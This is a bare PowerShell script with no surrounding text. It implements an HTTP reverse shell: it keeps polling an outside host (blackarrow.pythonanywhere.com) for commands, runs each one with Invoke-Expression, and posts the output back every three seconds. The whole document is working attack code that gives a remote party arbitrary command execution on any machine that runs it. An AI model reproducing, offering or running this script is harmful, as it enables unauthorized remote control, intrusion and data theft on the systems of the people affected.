While(1) {
    $c = (Invoke-WebRequest blackarrow.pythonanywhere.com/http_reverse_shell/?ready=true).Content
    If($c -ne '') {
        Invoke-WebRequest blackarrow.pythonanywhere.com/http_reverse_shell/ -Method Post -Body @{'stdout' = (iex $c | Out-String).Trim("`n")}
    }
    sleep 3
}